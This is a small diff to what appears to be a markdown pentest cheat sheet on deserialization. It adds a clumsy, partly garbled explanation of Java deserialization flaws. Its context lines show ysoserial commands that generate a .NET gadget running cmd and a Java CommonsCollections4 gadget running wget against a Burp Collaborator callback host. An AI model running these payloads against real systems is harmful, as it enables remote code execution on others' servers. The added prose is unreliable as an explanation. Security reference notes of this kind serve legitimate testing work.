@@ -12,6 +12,9 @@ ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /
 "
 ```
 # Java Deserialization 
+
+The deserialization vulnerabilities may occur when deserialize convert to an object any serialized stream without first validating in the Java Base Application.
+due to the combination of two rudimentary implementations flaws.The deserialization vulnerabilities are considered difficult to make it secure in the application for develops.
 ```
 
 java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget sdfsfdoztjxibkocen698fskck0ehs8yymn.burpcollaborator.net"
